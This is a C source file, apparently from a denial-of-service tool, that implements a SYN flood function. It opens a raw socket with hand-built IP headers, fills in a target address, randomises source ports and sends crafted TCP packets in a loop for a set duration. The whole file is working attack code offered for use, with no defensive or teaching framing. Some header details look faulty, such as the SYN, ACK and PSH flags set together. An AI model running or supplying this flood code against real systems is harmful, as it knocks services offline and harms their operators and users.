#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include "syn_attack.h"
#include "checksum.h"
#include "attack_params.h"

unsigned short tcp_checksum(const void* buff, size_t len, in_addr_t src_addr, in_addr_t dest_addr) {
    return tcp_udp_checksum(buff, len, src_addr, dest_addr, IPPROTO_TCP);
}

void* syn_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    int syn_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int one = 1;
    const int *val = &one;
    setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
    char packet[4096];
    memset(packet, 0, 4096);

    struct iphdr* iph = (struct iphdr*) packet;
    struct tcphdr* tcph = (struct tcphdr*) (packet + sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = params->target_addr.sin_port;
    dest.sin_addr = params->target_addr.sin_addr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    srand(time(NULL));
    iph->id = htonl(rand());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr("0.0.0.0");
    iph->daddr = params->target_addr.sin_addr.s_addr;

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        iph->check = generic_checksum((unsigned short*)packet, iph->tot_len);

        int random_port = 1024 + rand() % (65536 - 1024);
        tcph->source = htons(random_port);
        tcph->dest = params->target_addr.sin_port;
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 1;
        tcph->ack = 1;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        tcph->check = tcp_checksum(tcph, sizeof(struct tcphdr), iph->saddr, iph->daddr);
        sendto(syn_sock, packet, iph->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    close(syn_sock);
    return NULL;
}
